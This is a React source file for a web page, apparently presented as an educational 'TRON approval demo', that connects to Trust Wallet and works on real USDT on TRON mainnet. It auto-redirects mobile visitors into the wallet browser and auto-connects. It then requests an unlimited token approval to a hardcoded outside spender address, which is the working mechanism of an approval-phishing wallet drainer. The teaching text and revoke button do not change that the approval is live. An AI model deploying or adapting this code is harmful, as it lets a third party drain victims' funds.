import React, { useEffect, useState } from "react";

// TRC20 CONFIGURATION
// ====================

// ✅ USDT on TRON Mainnet (TRC20)
const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// ⚠️ Demo permission receiver (NO transfer logic used)
const SPENDER_ADDRESS = "TR9jYcLWCrE9WwP9s4pXa9sH2NkHRcXqGmK";

// TRC20 ABI (TRON compatible)
const TRC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" }
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  }
];

// Unlimited approval value (same as Ethereum)
const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [contract, setContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);
  const [tokenInfo, setTokenInfo] = useState({ name: "", symbol: "" });

  /* =========================
     HELPERS
  ========================= */
  const addLog = (msg) => {
    console.log(msg);
    setLogs((p) => [...p, msg]);
  };

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     TRUST WALLET DETECTION (TRON VERSION)
  ========================= */
  useEffect(() => {
    const checkTronWeb = () => {
      if (window.tronWeb && window.tronWeb.ready) {
        setIsTrustWallet(true);
        setTronWeb(window.tronWeb);
        addLog("📱 Trust Wallet (TRON) detected");
        
        // Auto-connect if wallet is already unlocked
        if (window.tronWeb.defaultAddress.base58) {
          handleAutoConnect();
        }
      } else {
        addLog("❌ Trust Wallet (TRON) not detected");
        
        // Mobile deep-link for TRON
        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
        if (isMobile) {
          const url = encodeURIComponent(window.location.href);
          // TRON coin_id = 195 in Trust Wallet
          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
        }
      }
    };

    checkTronWeb();

    // Check every second for TronWeb injection
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready && !tronWeb) {
        checkTronWeb();
      }
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  /* =========================
     AUTO CONNECT
  ========================= */
  const handleAutoConnect = async () => {
    try {
      const address = window.tronWeb.defaultAddress.base58;
      if (!address) return;

      // Get TRX balance
      const trxBalance = await window.tronWeb.trx.getBalance(address);
      const trxBalanceFormatted = trxBalance / 1000000; // Convert SUN to TRX

      // Initialize contract
      const tokenContract = await window.tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
      
      // Get token info
      let tokenName = "TRC20 Token";
      let tokenSymbol = "TRC20";
      
      try {
        tokenName = await tokenContract.name().call();
        tokenSymbol = await tokenContract.symbol().call();
      } catch (err) {
        console.log("Could not fetch token details:", err);
      }

      setWallet({
        address: address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        trx: trxBalanceFormatted.toFixed(6),
        hexAddress: window.tronWeb.address.toHex(address)
      });

      setContract(tokenContract);
      setTokenInfo({ name: tokenName, symbol: tokenSymbol });
      
      addLog("✅ Auto-connected to Trust Wallet");
      addLog(`💰 TRX Balance: ${trxBalanceFormatted.toFixed(4)} TRX`);
      setStep(2);
    } catch (err) {
      console.error("Auto-connect error:", err);
    }
  };

  /* =========================
     CONNECT TRUST WALLET (TRON VERSION)
  ========================= */
  const connectWallet = async () => {
    if (connecting) return;

    try {
      setConnecting(true);
      addLog("🔄 Connecting to Trust Wallet...");

      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("Please open this site inside Trust Wallet Browser with TRON network");
        return;
      }

      // Request account access (TRON version)
      const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
      
      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts returned");
      }

      const address = window.tronWeb.defaultAddress.base58;
      
      // Get TRX balance
      const trxBalance = await window.tronWeb.trx.getBalance(address);
      const trxBalanceFormatted = trxBalance / 1000000; // Convert SUN to TRX

      // Initialize TRC20 contract
      const tokenContract = await window.tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
      
      // Get token info
      let tokenName = "TRC20 Token";
      let tokenSymbol = "TRC20";
      
      try {
        tokenName = await tokenContract.name().call();
        tokenSymbol = await tokenContract.symbol().call();
      } catch (err) {
        console.log("Token details fetch error:", err);
      }

      setWallet({
        address: address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        trx: trxBalanceFormatted.toFixed(6),
        hexAddress: window.tronWeb.address.toHex(address)
      });

      setTronWeb(window.tronWeb);
      setContract(tokenContract);
      setTokenInfo({ name: tokenName, symbol: tokenSymbol });

      addLog("✅ Trust Wallet connected successfully");
      addLog(`🪙 Token: ${tokenName} (${tokenSymbol})`);
      setStep(2);
    } catch (err) {
      console.error(err);
      if (err.code === 4001 || err.message.includes("denied")) {
        addLog("❌ User rejected connection");
      } else if (err.code === -32002) {
        addLog("⏳ Connection request already pending in Trust Wallet");
      } else {
        addLog("❌ Wallet connection failed");
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     SIMULATION (TRON VERSION)
  ========================= */
  const simulate = async () => {
    try {
      setLoading(true);

      if (!wallet || !contract || !tronWeb) {
        addLog("❌ Wallet not ready");
        return;
      }

      addLog("🔍 Checking TRC20 token balance...");
      await sleep(400);

      // Check token balance
      const hexAddress = tronWeb.address.toHex(wallet.address);
      const rawBalance = await contract.balanceOf(hexAddress).call();
      const decimals = await contract.decimals().call();
      const balance = rawBalance.toString() / (10 ** decimals);
      
      addLog(`💰 ${tokenInfo.symbol} Balance: ${balance}`);
      await sleep(400);

      // Check existing allowance
      const hexSpender = tronWeb.address.toHex(SPENDER_ADDRESS);
      const allowance = await contract.allowance(hexAddress, hexSpender).call();
      if (allowance > 0) {
        addLog(`⚠️ Existing allowance: ${allowance / (10 ** decimals)} ${tokenInfo.symbol}`);
      }

      const ok = window.confirm(
        `⚠️ EDUCATIONAL DEMO - TRON NETWORK\n\n` +
        `Token: ${tokenInfo.name} (${tokenInfo.symbol})\n` +
        `This will approve UNLIMITED token spending.\n` +
        `Spender: ${SPENDER_ADDRESS}\n\n` +
        `No tokens will be transferred by this app.\n\n` +
        `Continue?`
      );

      if (!ok) {
        addLog("❌ User cancelled");
        return;
      }

      addLog("⏳ Sending approve transaction...");
      
      // Send TRON transaction
      const tx = await contract.approve(
        hexSpender,
        UNLIMITED
      ).send({
        feeLimit: 100000000, // 100 TRX fee limit
        callValue: 0,
        shouldPollResponse: false
      });

      addLog(`📝 Transaction sent: ${tx}`);
      addLog("⏳ Waiting for confirmation...");

      // Wait for transaction confirmation
      let confirmed = false;
      for (let i = 0; i < 30; i++) {
        try {
          const txInfo = await tronWeb.trx.getTransactionInfo(tx);
          if (txInfo && txInfo.id) {
            confirmed = true;
            if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
              addLog("✅ Transaction confirmed!");
            }
            break;
          }
        } catch (e) {
          // Still processing
        }
        await sleep(2000);
      }

      if (confirmed) {
        addLog("🚨 UNLIMITED TRC20 approval granted");
        addLog("⚠️ In real scenario, attacker could drain ALL your tokens!");
        setStep(3);
      } else {
        addLog("⚠️ Transaction still processing. Check wallet for status.");
      }
    } catch (err) {
      console.error(err);
      if (err.message && err.message.includes("denied")) {
        addLog("❌ User rejected transaction");
      } else if (err.message && err.message.includes("insufficient")) {
        addLog("❌ Insufficient TRX for energy/bandwidth");
      } else {
        addLog(`❌ Transaction failed: ${err.message || "Unknown error"}`);
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     REVOKE APPROVAL (TRON VERSION)
  ========================= */
  const revokeApproval = async () => {
    try {
      setLoading(true);
      addLog("🔄 Attempting to revoke approval...");

      if (!contract || !wallet || !tronWeb) {
        addLog("❌ Wallet not connected");
        return;
      }

      const hexSpender = tronWeb.address.toHex(SPENDER_ADDRESS);
      
      const tx = await contract.approve(
        hexSpender,
        0
      ).send({
        feeLimit: 100000000,
        callValue: 0
      });

      addLog(`✅ Revoke transaction sent: ${tx}`);
      addLog("⏳ Waiting for confirmation...");

      await sleep(5000);
      addLog("✅ Approval revoked (check wallet for confirmation)");
      
    } catch (err) {
      console.error("Revoke error:", err);
      addLog(`❌ Revoke failed: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
        <h1 className="text-xl font-bold text-center mb-4">
          🔐 Trust Wallet - TRON Approval Demo
        </h1>

        {/* Network Badge */}
        <div className="bg-yellow-900/30 text-yellow-400 text-center text-sm p-2 rounded mb-3">
          🌐 TRON Network | TRC20 Tokens
        </div>

        {/* Security Warning */}
        <div className="bg-red-900/20 border border-red-700 p-3 rounded text-sm mb-4">
          <p className="font-bold text-red-300 mb-1">⚠️ SECURITY WARNING</p>
          <p className="text-gray-300">This demo shows unlimited approval risks. Use only with test accounts.</p>
        </div>

        {/* Logs (Always Visible) */}
        {logs.length > 0 && (
          <div className="bg-black p-3 rounded text-sm space-y-1 mb-3 max-h-60 overflow-y-auto">
            {logs.map((l, i) => (
              <div key={i} className={`p-1 ${l.includes('❌') ? 'text-red-400' : l.includes('✅') ? 'text-green-400' : l.includes('⚠️') ? 'text-yellow-400' : ''}`}>
                {l}
              </div>
            ))}
          </div>
        )}

        {/* Connected Badge */}
        {wallet && (
          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-3 rounded mb-3">
            <div className="flex justify-between items-center mb-1">
              <span>✅ Wallet Connected</span>
              <span className="text-xs bg-green-800 px-2 py-1 rounded">TRON</span>
            </div>
            <div className="grid grid-cols-2 gap-2 mt-2">
              <div>
                <p className="text-gray-400 text-xs">Address</p>
                <p className="truncate">{wallet.short}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs">TRX Balance</p>
                <p>{wallet.trx} TRX</p>
              </div>
              {tokenInfo.name && (
                <>
                  <div>
                    <p className="text-gray-400 text-xs">Token</p>
                    <p className="truncate">{tokenInfo.name}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-xs">Symbol</p>
                    <p>{tokenInfo.symbol}</p>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {!isTrustWallet && (
          <div className="bg-red-900/30 p-3 rounded text-sm mb-4">
            ❌ Open this link inside <b>Trust Wallet Browser</b> with TRON network
          </div>
        )}

        {step === 1 && (
          <button
            onClick={connectWallet}
            disabled={connecting}
            className={`w-full py-3 rounded font-bold ${connecting ? "bg-gray-600 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700"}`}
          >
            {connecting ? "Connecting..." : "Connect Trust Wallet (TRON)"}
          </button>
        )}

        {step === 2 && wallet && (
          <>
            <div className="space-y-3">
              <button
                onClick={simulate}
                disabled={loading}
                className={`w-full py-3 rounded font-bold ${loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600 hover:bg-red-700"}`}
              >
                {loading ? "Processing..." : "🚨 Start TRC20 Approval Simulation"}
              </button>

              <button
                onClick={revokeApproval}
                disabled={loading}
                className="w-full py-3 bg-green-700 hover:bg-green-800 rounded font-bold"
              >
                🔒 Revoke Existing Approval
              </button>
            </div>
          </>
        )}

        {step === 3 && (
          <div className="space-y-3">
            <div className="bg-black p-4 rounded border border-red-700">
              <p className="text-red-400 font-bold text-center mb-2">
                ⚠️ UNLIMITED APPROVAL GRANTED
              </p>
              <p className="text-sm text-gray-300 mb-3">
                You've successfully demonstrated unlimited TRC20 approval. 
                In real scenarios, this is extremely dangerous!
              </p>
              
              <div className="bg-gray-800 p-3 rounded text-sm">
                <p className="font-bold mb-1">📚 Key Takeaways:</p>
                <ul className="list-disc pl-4 space-y-1 text-gray-300">
                  <li>Never approve unlimited spending</li>
                  <li>Always verify spender addresses</li>
                  <li>Use reasonable spending limits</li>
                  <li>Revoke unused approvals regularly</li>
                </ul>
              </div>
            </div>

            <div className="flex gap-2">
              <button
                onClick={revokeApproval}
                className="flex-1 py-3 bg-green-700 hover:bg-green-800 rounded font-bold"
              >
                🔒 Revoke Approval
              </button>
              <button
                onClick={() => setStep(2)}
                className="flex-1 py-3 bg-gray-700 hover:bg-gray-800 rounded font-bold"
              >
                🔄 Try Again
              </button>
            </div>
          </div>
        )}

        {/* Footer Info */}
        <div className="mt-6 pt-4 border-t border-gray-800 text-center text-xs text-gray-500">
          <p>Token: {tokenInfo.name || "TRC20 Token"} ({tokenInfo.symbol || "TRC20"})</p>
          <p className="mt-1">Contract: {TRC20_TOKEN_ADDRESS.slice(0, 10)}...</p>
        </div>
      </div>
    </div>
  );
}

export default App;